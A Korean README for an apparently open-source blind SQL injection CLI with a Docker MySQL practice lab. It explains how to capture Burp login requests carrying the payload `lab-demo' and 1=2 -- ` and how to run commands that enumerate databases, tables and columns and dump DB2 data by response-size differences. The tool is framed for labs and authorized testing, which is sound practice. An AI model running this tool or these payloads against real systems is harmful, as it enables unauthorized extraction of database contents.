# Blind SQL Injection 실습 도구

저장한 HTTP 요청의 참·거짓 응답 크기 차이를 이용해 DB 정보를 조회하고, 결과를 SQLite 파일로 저장하는 Python CLI입니다. 직접 준비한 환경이나 테스트 권한이 있는 환경에서 사용하세요.

**처음 사용한다면 [MySQL 실습 빠른 시작](#1-mysql-실습-빠른-시작)부터 진행하세요.** Docker로 실습 서버를 띄우고 기본 정보 → DB 목록 → 테이블 → 컬럼 순서로 확인할 수 있습니다. CLI만 설치해 기존 실습 환경에 연결하려면 [Python 설치](#2-python으로-cli-설치)를 참고하세요.

> MySQL·Oracle·DB2·MSSQL·PostgreSQL의 메타데이터 조회를 지원합니다. **데이터 덤프(`--dump`)는 현재 DB2만 지원합니다.**

## 목차

1. [MySQL 실습 빠른 시작](#1-mysql-실습-빠른-시작)
2. [Python으로 CLI 설치](#2-python으로-cli-설치)
3. [Burp 요청 파일 준비](#3-burp-요청-파일-준비)
4. [명령어와 전체 옵션](#4-명령어와-전체-옵션)
5. [DBMS별 사용 예제](#5-dbms별-사용-예제)
6. [결과 확인](#6-결과-확인)
7. [오류 해결](#7-오류-해결)
8. [DB2 실습 서버](#8-db2-실습-서버)
9. [지원 범위와 동작 방식](#9-지원-범위와-동작-방식)
10. [개발·검사·프로젝트 구조](#10-개발검사프로젝트-구조)

## 1. MySQL 실습 빠른 시작

### 1-1. 프로젝트 받기

Git, Docker와 Docker Compose가 필요합니다. 아래 명령은 프로젝트 루트에서 실행합니다. Windows에서는 Docker가 Linux 컨테이너를 실행할 수 있는 상태여야 합니다.

```sh
git clone https://github.com/kazal92/blind_sqli.git
cd blind_sqli
docker info
docker compose version
```

이미 프로젝트가 있다면 해당 폴더로 이동하면 됩니다.

### 1-2. 실습 서버 빌드 및 실행

```sh
docker compose -f lab/compose.yaml up -d --build --wait --wait-timeout 180 db web
```

첫 실행에는 MySQL·Python 이미지 다운로드와 빌드 시간이 필요합니다.

| 항목 | 값 |
|---|---|
| 접속 주소 | http://127.0.0.1:5080 |
| 실습 로그인 계정 | `admin` / `lab-demo` |
| DBMS | MySQL 8.4 |
| 실습 DB / 테이블 | `lab` / `users` |
| 컬럼 | `id`, `username`, `password` |
| 외부 접근 | 웹 포트는 호스트의 `127.0.0.1:5080`에만 연결 |

브라우저에서 접속해 실습 계정으로 로그인하세요. 상태와 로그는 다음 명령으로 확인합니다.

```sh
docker compose -f lab/compose.yaml ps
docker compose -f lab/compose.yaml logs --tail 100 db web
```

### 1-3. 제공된 요청으로 CLI 실행

아래 명령은 컨테이너 안의 Python과 `lab/request.http`를 사용하므로 PC에 Python을 설치할 필요가 없습니다. 컨테이너의 기본 실행 경로는 `/app`입니다.

```sh
# DB 버전과 접속 사용자
docker compose -f lab/compose.yaml run --rm --no-deps cli -r lab/request.http -s http -p password --dbms mysql --basic -d /tmp/basic.db

# DB 목록
docker compose -f lab/compose.yaml run --rm --no-deps cli -r lab/request.http -s http -p password --dbms mysql --dbs -d /tmp/dbs.db

# lab DB의 테이블 목록
docker compose -f lab/compose.yaml run --rm --no-deps cli -r lab/request.http -s http -p password --dbms mysql --tables -D lab -d /tmp/tables.db

# users 테이블의 컬럼 목록
docker compose -f lab/compose.yaml run --rm --no-deps cli -r lab/request.http -s http -p password --dbms mysql --columns -D lab -T users -d /tmp/columns.db
```

마지막 두 명령의 결과 JSON은 각각 다음과 같습니다. 진행 메시지와 저장 완료 메시지도 함께 출력됩니다.

```json
{"tables": ["users"]}
```

```json
{"users": ["id", "username", "password"]}
```

여기서는 임시 결과를 컨테이너의 `/tmp`에 저장합니다. `--rm`으로 컨테이너가 제거되면 이 파일도 사라집니다. PC에 결과를 남기려면 다음 절의 `lab/run.sh`를 사용하세요.

실습 서버를 통한 기본 정보·DB·테이블·컬럼 검사 네 가지를 한 번에 실행할 수도 있습니다.

```sh
docker compose -f lab/compose.yaml run --rm --no-deps --entrypoint python cli -m lab.smoke
```

### 1-4. Burp 요청으로 실행하고 결과 남기기

이 절의 셸 스크립트는 Bash가 필요합니다. Windows에서는 WSL 또는 Git Bash에서 실행하세요. PowerShell에서는 [Python CLI](#2-python으로-cli-설치)로 요청 파일을 직접 지정할 수도 있습니다.

1. `requests` 폴더를 만듭니다: `mkdir -p requests`
2. Burp에서 실습 서버의 `/login` 요청을 캡처합니다.
3. `password` 값을 `lab-demo' and 1=2 -- `로 수정합니다. 끝의 공백을 포함하세요.
4. 요청 첫 줄과 헤더를 포함한 원본 HTTP 요청을 `requests/burp.http`에 UTF-8로 저장합니다.
5. 다음 명령으로 조회합니다.

```sh
bash lab/run.sh --basic
bash lab/run.sh --dbs
bash lab/run.sh --tables -D lab
bash lab/run.sh --columns -D lab -T users
```

`lab/run.sh`는 요청 경로, HTTP, 대상 `password`, DBMS `mysql`을 자동으로 지정합니다. 결과는 **`lab/results/burp-result.db`**에 누적됩니다. Docker 실행 권한 때문에 `sudo`가 필요한 Linux 환경에서는 `sudo bash lab/run.sh ...`로 실행할 수 있습니다.

직접 만든 `burp.http` 대신 제공된 예제로 시작하려면 다음처럼 복사하세요.

```sh
mkdir -p requests
cp lab/request.http requests/burp.http
bash lab/run.sh --tables -D lab
```

### 1-5. 서버 종료

```sh
docker compose -f lab/compose.yaml down
```

DB 볼륨은 유지됩니다. **실습 DB를 삭제하고 초기 데이터로 다시 만들 때만** 다음 명령을 사용하세요.

```sh
docker compose -f lab/compose.yaml down -v
docker compose -f lab/compose.yaml up -d --build --wait --wait-timeout 180 db web
```

`lab/publish.sh`는 이미지 빌드·서버 실행·실제 DB 검사를 수행한 뒤 **Docker Hub에 이미지를 업로드하는 배포용 스크립트**입니다. 일반 실습에는 위 Compose 명령을 사용하면 됩니다. 배포할 때는 Docker Hub 로그인과 해당 이미지 저장소의 쓰기 권한이 필요하며, 이미지 이름은 `LAB_IMAGE` 환경변수로 바꿀 수 있습니다.

## 2. Python으로 CLI 설치

Python **3.10 이상**이 필요합니다. CLI의 실행 의존성은 `requests`이며, DB 드라이버 없이 HTTP로 실습 서버에 접근합니다.

### Windows PowerShell

```powershell
cd C:\Users\jh\projects\blind_sqli
py -m venv .venv
.\.venv\Scripts\python.exe -m pip install -r requirements.txt
.\.venv\Scripts\python.exe sqli.py --help
```

가상환경을 활성화하지 않고 실행하는 방식입니다. 이후 예제의 `python`을 `.\.venv\Scripts\python.exe`로 바꿔 실행하면 됩니다.

### Linux / macOS / WSL

```sh
cd blind_sqli
python3 -m venv .venv
source .venv/bin/activate
python -m pip install -r requirements.txt
python sqli.py --help
```

로컬 MySQL Docker 실습 서버가 실행 중이라면 다음 명령으로 연결할 수 있습니다.

```sh
python sqli.py -r lab/request.http -s http -p password --dbms mysql --tables -D lab -d result.db
```

이때 `lab/request.http`의 `Host`가 `127.0.0.1:5080`인지 확인하세요. `examples/request.http`는 **DB2의 `127.0.0.1:5001`용**이며 MySQL 빠른 시작에는 사용하지 않습니다.

## 3. Burp 요청 파일 준비

### 기본 규칙

- 요청 첫 줄은 `GET /경로 HTTP/1.1` 또는 `POST /경로 HTTP/1.1` 형식이어야 합니다. 경로에 전체 URL을 넣지 않습니다.
- `Host` 헤더에 실제 실습 서버의 주소와 포트를 지정합니다.
- 헤더와 본문 사이에는 빈 줄이 필요합니다.
- `-p`로 선택한 값 안에 **`1=2`가 정확히 한 번** 있어야 합니다. 도구는 이 부분만 조건식으로 바꿉니다.
- 대상 파라미터는 한 번만 존재해야 합니다. POST에서는 대상 파라미터를 본문에서 찾습니다.
- GET 쿼리와 POST 폼은 URL 인코딩을 해석합니다. JSON 문자열의 `+`, `%`는 그대로 보존합니다.
- 쿠키나 인증 헤더가 필요하면 요청 파일에 포함합니다. 인증이 만료되면 파일을 갱신하세요.

실제 인증 정보가 들어 있는 요청은 `requests/`에 보관하세요. 이 폴더와 `.env`, 결과 `*.db`, `lab/results/`는 Git에서 제외됩니다.

### GET 예제: MySQL 실습 서버

아래 내용을 `requests/mysql.http`로 저장합니다. 헤더 다음의 빈 줄도 포함하세요.

```http
GET /login?username=admin&password=lab-demo%27+and+1%3D2+--+ HTTP/1.1
Host: 127.0.0.1:5080

```

디코딩된 `password` 값은 `lab-demo' and 1=2 -- `입니다. `1=2`를 `1=1`로 바꾸었을 때 로그인에 성공하고 응답 본문이 더 길어지는지 Burp Repeater에서 확인하세요.

```sh
python sqli.py -r requests/mysql.http -s http -p password --dbms mysql --basic
```

### POST 폼 예제: MySQL 실습 서버

```http
POST /login HTTP/1.1
Host: 127.0.0.1:5080
Content-Type: application/x-www-form-urlencoded

username=admin&password=lab-demo%27+and+1%3D2+--+
```

이 요청을 `requests/mysql-form.http`로 저장했다면 다음처럼 실행합니다.

```sh
python sqli.py -r requests/mysql-form.http -s http -p password --dbms mysql --tables -D lab
```

### POST JSON 예제: DB2 실습 서버

다음 예제는 [DB2 서버](#8-db2-실습-서버)와 `example` 사용자 데이터가 준비되어 있어야 합니다. MySQL 실습 서버는 JSON 로그인 API를 제공하지 않습니다.

```http
POST /api/db2 HTTP/1.1
Host: 127.0.0.1:5001
Content-Type: application/json

{"username":"example","password":"example' and 1=2 -- "}
```

파일을 `requests/db2-json.http`로 저장한 뒤 실행합니다.

```sh
python sqli.py -r requests/db2-json.http -s http -p password --dbms db2 --basic
```

`Content-Length`는 생략해도 됩니다. 전송할 때 도구가 본문 길이를 다시 계산합니다. HTTP 요청은 파싱 후 재구성되므로 원본의 바이트 배열 그대로 재전송되는 방식은 아닙니다.

## 4. 명령어와 전체 옵션

기본 형태는 다음과 같습니다. `<...>`는 환경에 맞게 바꾸는 자리 표시자입니다.

```text
python sqli.py -r <요청파일> -p <파라미터> --dbms <DBMS> <실행모드> [추가옵션]
```

예를 들어 다음 명령은 `password`의 조건식을 바꾸면서 MySQL `lab` DB의 `users` 컬럼을 조회하고 `result.db`에 저장합니다.

```sh
python sqli.py -r lab/request.http -s http -p password --dbms mysql --columns -D lab -T users -d result.db
```

### 실행 모드: 한 번에 하나 선택

| 모드 | 조회 내용 | 추가 필수 옵션 |
|---|---|---|
| `--basic` | 버전·접속 사용자, DB2는 현재 DB | 없음 |
| `--dbs` | DB 또는 소유자·스키마 목록 | 없음 |
| `--tables` | 테이블 목록 | `-D` |
| `--columns` | 컬럼 목록 | `-D`, `-T` |
| `--dump` | DB2 데이터 조회 | `-D`, 테이블 하나의 `-T`, `-C`, `--order-by` |

### 입력·조회·저장 옵션

| 옵션 | 의미 | 기본값 / 조건 |
|---|---|---|
| `-r`, `--request-file` | UTF-8 원본 HTTP 요청 파일 | 필수 |
| `-p` | 조건식을 교체할 파라미터 이름 | 필수 |
| `--dbms` | `mysql`, `oracle`, `db2`, `mssql`, `postgresql` | 필수, 자동 탐지하지 않음 |
| `-s` | `http` 또는 `https` | `https` |
| `-d` | 결과 SQLite 파일 경로 | `result.db` |
| `-D` | DB 이름 또는 Oracle·DB2의 소유자·스키마 | 조회 모드에 따라 필수 |
| `-T` | 테이블 이름, 여러 개는 `"USERS,ORDERS"` | 컬럼 조회·덤프에 필요 |
| `-C` | 덤프할 컬럼, 여러 개는 `"ID,NAME"` | `--dump`에서만 사용 |
| `--db-schema` | MSSQL·PostgreSQL 스키마 | 각각 `dbo`, `public` |
| `--order-by` | DB2 덤프의 정렬용 고유 컬럼 하나 | `--dump`에서만 사용 |
| `-h`, `--help` | 전체 도움말 | 표시 후 종료 |

**`-d`는 저장 파일, `-D`는 조회할 DB/스키마입니다.** 대소문자를 구분하세요. DBMS 값과 프로토콜은 대소문자를 정규화하지만, DB·테이블·컬럼 이름은 입력한 이름을 사용합니다.

### 통신·판별·조회 상한

| 옵션 | 의미 | 기본값 |
|---|---|---|
| `--proxy` | 프록시 URL 또는 `host:port` | 지정하지 않음 |
| `--timeout` | HTTP 요청 한 건의 제한 시간(초) | `30` |
| `--threshold` | 거짓 기준 응답과 참 응답의 본문 크기 차이 기준(바이트) | `20` |
| `--max-len` | 문자열 하나의 최대 길이 | `256` |
| `--max-rows` | 조회할 목록 또는 덤프의 최대 행 수 | `1000` |
| `--insecure` | HTTPS 인증서 검증 생략 | 기본은 인증서 검증 |

판별은 **`현재 본문 크기 - 거짓 기준 본문 크기 > threshold`**일 때 참입니다. 기본값에서는 정확히 20바이트 차이는 참으로 판별하지 않습니다. 응답 본문의 크기를 사용하며 `Content-Length` 헤더값을 직접 비교하지 않습니다.

```sh
# Burp 프록시 사용
python sqli.py -r requests/mysql.http -s http -p password --dbms mysql --basic --proxy 127.0.0.1:8080

# 느린 응답이나 더 큰 목록에 맞춘 상한 조정
python sqli.py -r requests/mysql.http -s http -p password --dbms mysql --tables -D lab --timeout 60 --max-rows 2000 --max-len 512
```

Burp로 대량 요청을 확인할 때는 Intercept를 끄거나 요청을 계속 전달해야 합니다. HTTPS 실습에서 자체 서명 인증서를 사용할 때만 필요에 따라 `--insecure`를 추가하세요.

## 5. DBMS별 사용 예제

각 요청 파일은 **해당 DBMS를 사용하는 실습 웹 서버**에서 따로 준비해야 합니다. `--dbms`를 바꿔도 웹 서버의 DB 연결이 바뀌지 않습니다.

| DBMS | `-D`의 의미 | 스키마 지정 및 주의점 |
|---|---|---|
| MySQL | 데이터베이스 | 예: `lab` |
| Oracle | 소유자(owner) | 예: `LAB`; 실제 카탈로그 이름에 맞춤 |
| DB2 | 스키마 | 예: `LAB`; `--basic` 결과의 현재 DB 이름과 구분 |
| MSSQL | 데이터베이스 | `--db-schema`로 스키마 지정, 기본 `dbo` |
| PostgreSQL | 현재 연결된 데이터베이스 | 스키마 기본 `public`; 다른 DB로 연결 전환 불가 |

```sh
# Oracle: 소유자 목록 → 소유자의 테이블
python sqli.py -r requests/oracle.http -s http -p password --dbms oracle --dbs
python sqli.py -r requests/oracle.http -s http -p password --dbms oracle --tables -D LAB

# DB2: 스키마 목록 → 여러 테이블의 컬럼
python sqli.py -r requests/db2.http -s http -p password --dbms db2 --dbs
python sqli.py -r requests/db2.http -s http -p password --dbms db2 --columns -D LAB -T "USERS,ORDERS"

# SQL Server: DB와 스키마를 나누어 지정
python sqli.py -r requests/mssql.http -s http -p password --dbms mssql --tables -D lab --db-schema dbo
python sqli.py -r requests/mssql.http -s http -p password --dbms mssql --columns -D lab --db-schema dbo -T users

# PostgreSQL: 웹 서버가 현재 연결 중인 lab DB
python sqli.py -r requests/postgresql.http -s http -p password --dbms postgresql --tables -D lab --db-schema public
python sqli.py -r requests/postgresql.http -s http -p password --dbms postgresql --columns -D lab --db-schema public -T users
```

### DB2 데이터 덤프

```sh
python sqli.py -r requests/db2.http -s http -p password --dbms db2 --dump -D LAB -T USERS -C "ID,NAME" --order-by ID -d db2-result.db
```

- 테이블은 하나만 지정할 수 있습니다.
- `--order-by`에는 행을 고유하게 정렬할 컬럼 하나를 지정합니다. 자동 PK 검색은 하지 않습니다.
- 도구가 컬럼의 고유성을 확인하지는 않습니다. 중복 정렬 값이나 조회 중 데이터 변경이 있으면 행별 결과가 섞일 수 있습니다.
- NULL은 빈 문자열로 저장하여 NULL과 빈 문자열을 구분할 수 없습니다.

## 6. 결과 확인

성공하면 결과 JSON과 `결과 저장 완료: ...`가 출력됩니다. 기본 저장 위치는 명령을 실행한 디렉터리의 `result.db`입니다. 저장 경로의 상위 폴더는 미리 만들어야 합니다.

DB Browser for SQLite 같은 SQLite 도구로 파일을 열거나, Python 기본 모듈로 확인할 수 있습니다.

```sh
python -m sqlite3 result.db "SELECT id, created_at, dbms, mode, database_name, schema_name, results_json FROM runs ORDER BY id DESC LIMIT 5;"
```

위 `python -m sqlite3` 명령은 Python 3.12 이상에서 사용합니다. Python 3.10·3.11에서는 SQLite 뷰어나 `sqlite3` CLI로 다음 SQL을 실행하세요.

```sql
SELECT id, created_at, dbms, mode, database_name, schema_name, results_json
FROM runs
ORDER BY id DESC
LIMIT 5;
```

Bash 실습 스크립트를 사용했다면 `result.db` 대신 `lab/results/burp-result.db`를 여세요.

| 테이블 | 저장 내용 |
|---|---|
| `runs` | 성공한 실행별 DBMS·모드·DB·스키마·전체 결과 JSON |
| `basic_results` | 기본 정보의 필드별 최근 저장 값 |
| `basic_info` | Version·User 호환용 정보 |
| `dbs_info` | DB·소유자·스키마 목록 |
| `table_info` | 테이블 목록 |
| `column_info` | 컬럼 목록 |
| `data_dump` | DB2 덤프의 행·컬럼별 값 |

여러 DBMS·스키마의 결과를 구분할 때는 **`runs`**를 기준으로 확인하세요. 호환용 목록 테이블에는 DBMS·스키마 구분이 없고, `basic_results`도 실행별 이력 테이블은 아닙니다.

한 실행의 결과는 완료 후 하나의 트랜잭션으로 저장됩니다. 중간에 실패하면 해당 실행의 조회 결과는 저장되지 않으며 기존 성공 기록은 유지됩니다. 실패하더라도 초기화 과정에서 빈 결과 파일이나 테이블은 생길 수 있습니다. DB2 덤프는 별도의 사용자 테이블을 생성하지 않고 `data_dump`에 저장합니다.

## 7. 오류 해결

| 증상 / 메시지 | 확인할 내용 |
|---|---|
| 요청 파일을 찾을 수 없음 | 현재 작업 폴더와 `-r` 경로 확인. 프로젝트 루트에서 실행 |
| `거짓 조건 1=2가 정확히 한 번 필요합니다` | `-p`로 지정한 값 안에 `1=2`가 한 번 있는지 확인. GET·폼은 URL 디코딩 후 검사 |
| `대상 파라미터는 문자열 값 하나로 지정해야 합니다` | 파라미터 이름·중복 여부 확인. POST는 본문에 대상 값 필요, JSON은 최상위 문자열 값 필요 |
| `참·거짓 응답을 구분할 수 없습니다` | Repeater에서 `1=2`와 `1=1` 비교. 참 응답 본문이 기준보다 `--threshold`를 초과해 길어야 함 |
| `HTTP 301/302` 등 | 최종 URL의 요청을 다시 저장. 도구는 리디렉션을 따라가지 않음 |
| `HTTP 401/403` | 인증 쿠키·토큰·접근 권한과 세션 만료 확인 |
| `HTTP 500` | 서버 로그, SQL 문맥, 선택한 `--dbms`, 요청값 확인 |
| `HTTP 요청 실패 (...)` | 서버 실행 상태, Host·포트, `-s http`, 프록시와 인증서 확인 |
| `설정한 상한 ...을 초과했습니다` | 길이·행 수라면 `--max-len`·`--max-rows` 조정. 문자 코드 상한 127 초과라면 비ASCII 문자일 수 있음 |
| 결과가 빈 목록 | 실제 DB·소유자·스키마·테이블 이름과 조회 권한 확인. PostgreSQL은 현재 연결된 DB만 조회 |
| `unable to open database file` | `-d` 상위 폴더 존재 여부와 쓰기 권한 확인 |
| Docker 서버 기동 실패 | `docker info`, Compose 로그, 5080 포트 점유 여부 확인 |
| `lab/run.sh`가 요청 파일을 요구함 | `requests/burp.http`를 먼저 준비 |

참 응답이 더 짧거나, 광고·시각·랜덤값 등으로 본문 크기가 계속 달라지는 페이지에는 현재 판별 방식이 적합하지 않습니다. 임계값 조정만으로 안정성이 보장되지는 않습니다.

## 8. DB2 실습 서버

`test_web/app.py`는 별도로 준비한 DB2에 접속하는 Flask 서버입니다. DB2 서버 설치나 초기 테이블 생성은 자동으로 수행하지 않습니다.

### 준비

- DB2 서버, 데이터베이스, 접속 사용자와 권한을 준비합니다.
- 접속 사용자가 조회할 수 있는 기본 스키마에 `USERS` 테이블을 준비합니다. 로그인에 `USERNAME`, `PASSWORD` 컬럼이 필요합니다.
- 제공 요청 예제는 `example` / `example` 계정을 가정합니다. 다른 데이터를 사용하면 요청 파일도 바꾸세요.

프로젝트 루트에서 의존성을 설치합니다.

```sh
python -m pip install -r test_web/requirements.txt
```

`ibm_db` 설치와 접속에는 환경에 맞는 드라이버 구성이 필요할 수 있습니다. 설정 예제는 `test_web/.env.example`에 있으며 **`.env` 파일을 자동으로 읽지는 않습니다.**

Linux / macOS / WSL:

```sh
export DB2_DATABASE=testdb
export DB2_HOST=127.0.0.1
export DB2_PORT=50000
export DB2_USER=your_lab_user
export DB2_PASSWORD='replace_me'
python test_web/app.py
```

Windows PowerShell에서는 의존성을 설치한 가상환경의 Python을 사용합니다.

```powershell
$env:DB2_DATABASE = "testdb"
$env:DB2_HOST = "127.0.0.1"
$env:DB2_PORT = "50000"
$env:DB2_USER = "your_lab_user"
$env:DB2_PASSWORD = "replace_me"
.\.venv\Scripts\python.exe test_web/app.py
```

| 경로 | 용도 |
|---|---|
| `http://127.0.0.1:5001/db2` | GET·POST 폼 로그인 |
| `http://127.0.0.1:5001/api/db2` | POST JSON 로그인 |
| `http://127.0.0.1:5001/api/ping-db2` | DB 연결 확인 |

서버를 켠 상태에서 다른 터미널로 조회합니다.

```sh
python sqli.py -r examples/request.http -s http -p password --dbms db2 --basic
```

기본 바인딩은 `127.0.0.1:5001`, 디버그 모드는 꺼져 있습니다. 변경이 필요하면 `LAB_HOST`, `LAB_PORT` 환경변수를 지정하세요. 남아 있는 Oracle HTML 템플릿에 대응하는 Oracle 서버 라우트는 구현되어 있지 않습니다.

## 9. 지원 범위와 동작 방식

| DBMS | 기본 정보 | `--dbs` | 테이블·컬럼 | 데이터 덤프 |
|---|---|---|---|---|
| MySQL | 버전·사용자 | DB 목록 | 지원 | 미지원 |
| Oracle | 버전·사용자 | `all_tables`에 보이는 소유자 목록 | 지원 | 미지원 |
| DB2 | 현재 DB | 스키마 목록 | 지원 | 지원 |
| MSSQL | 버전·사용자 | DB 목록 | 지원, SQL Server 2012 이상 구문 사용 | 미지원 |
| PostgreSQL | 버전·사용자 | DB 목록 | 현재 연결된 DB 내에서 지원 | 미지원 |

지원 표는 코드의 구현 범위입니다. 모든 DBMS·버전의 실제 서버 검증을 의미하지 않습니다. 실제 서버 검사 경로로는 MySQL 실습용 `lab.smoke`를 제공하며, 자동 단위 테스트는 모의 HTTP 응답·SQLite 평가와 일부 DBMS의 SQL 구문 검사를 사용합니다.

실행은 다음 순서로 진행됩니다.

1. 요청 파일과 옵션을 검증하고 거짓 요청(`1=2`)의 본문 크기를 측정합니다.
2. 참 요청(`1=1`)을 보내 응답을 구분할 수 있는지 확인합니다.
3. 선택한 DBMS의 SQL로 개수·길이·각 문자 코드를 이진 탐색합니다.
4. 전체 조회 성공 후 결과를 출력하고 SQLite에 저장합니다.

현재 제한:

- 문자 추출 범위는 **ASCII 0–127**입니다. 한글 등 범위를 넘는 문자 추출은 지원하지 않습니다.
- GET 쿼리, POST 폼, POST JSON 최상위 문자열 파라미터를 지원합니다. POST 쿼리 파라미터를 추출 대상으로 선택하는 기능은 없습니다.
- multipart, XML, 중첩 JSON 대상, GET 본문, 중복 HTTP 헤더·JSON 키는 지원하지 않습니다. GraphQL 전용 요청 처리는 제공하지 않습니다.
- DBMS 자동 탐지, 시간 기반 판별, 자동 PK 탐색은 제공하지 않습니다.
- HTTP 오류·리디렉션·통신 실패는 거짓으로 간주하지 않고 중단합니다.
- SQL NULL을 메타데이터 추출에서 별도로 처리하지 않습니다. DB2 덤프의 NULL은 빈 문자열로 변환합니다.

이전 버전의 `REQUEST_STRING` 상수 대신 `-r`로 파일을 지정합니다. `bak/sqli_bak.py`는 과거 참고용입니다. 과거 Git 기록에 포함되었던 실제 자격 증명을 계속 사용하고 있다면 교체하세요.

## 10. 개발·검사·프로젝트 구조

```sh
python -m pip install -r requirements-dev.txt
python -m ruff check sqli.py sqli_tool tests test_web/app.py
python -m unittest discover -s tests -v
```

GitHub Actions는 push·pull request에서 Python 3.10·3.12·3.13으로 위 검사를 실행하도록 구성되어 있습니다. 실제 DB 통합 검사나 이미지 배포는 이 워크플로에 포함하지 않습니다.

```text
sqli.py                    CLI 진입점
sqli_tool/
  cli.py                   옵션·입력 검증
  http.py                  HTTP 요청 파싱·통신
  dbms.py                  DBMS별 SQL
  engine.py                응답 판별·이진 탐색·조회
  storage.py               SQLite 결과 저장
  main.py                  실행·종료 처리
lab/
  compose.yaml             MySQL·웹·CLI 컨테이너 구성
  Dockerfile.db            MySQL 이미지·초기 데이터 구성
  Dockerfile.web           실습 웹 서버·CLI 이미지
  init.sql                 실습 DB·테이블·계정 데이터
  request.http             MySQL 실습 요청 예제
  run.sh                   Burp 요청 실행·결과 보관
  smoke.py                 실제 MySQL을 통한 네 가지 검사
  publish.sh               검사 후 Docker Hub 이미지 업로드
examples/request.http      DB2 요청 예제
test_web/                  별도 DB2용 Flask 실습 서버
tests/                     단위·SQL 구문 테스트
.github/workflows/tests.yml 자동 검사 워크플로
```
